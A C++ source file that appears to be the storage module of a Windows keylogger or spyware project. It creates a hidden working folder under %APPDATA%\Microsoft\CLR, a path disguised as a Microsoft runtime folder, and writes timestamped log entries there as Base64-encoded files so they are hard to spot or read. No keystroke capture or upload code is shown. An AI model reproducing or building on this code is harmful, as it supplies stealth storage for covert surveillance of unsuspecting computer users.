#include "IO.h"

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"

#include "Helper.h"
#include "Base64.h"

/**
* Return the app working directory
*/
std::string IO::getOurPath(const bool append_separator = false)
{
    std::string appdata_dir(getenv("APPDATA"));
    std::string full = appdata_dir + "\\Microsoft\\CLR";

    return full + (append_separator ? "\\" : "");
}

/**
* Creates a new directory
*/
bool IO::mkOneDir(std::string path)
{
    return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

/**
*
*/
bool IO::mkDir(std::string path)
{
    for (char &c : path) {

        if (c == '\\') {
            c = '\0';

            if (! mkOneDir(path)) {
                return false;
            }

            c = '\\';
        }
    }

    return true;
}

template <class T>

/**
*
*/
std::string IO::writeLog(const T &message)
{
    std::string path = getOurPath(true);

    Helper::DateTime dt;
    std::string filename = dt.getDateTimeString("_") + ".log";

    try {
        std::ofstream file(path + filename);
        if (!file) return "";

        std::ostringstream s;
        s << "[" << dt.getDateTimeString() << "]" <<
        std::endl << message << std::endl;

        std::string data = Base64::encode(s.str());

        file << data;
        if (!file) return "";

        file.close();
        return filename;

    } catch (...) {
        return "";
    }
}
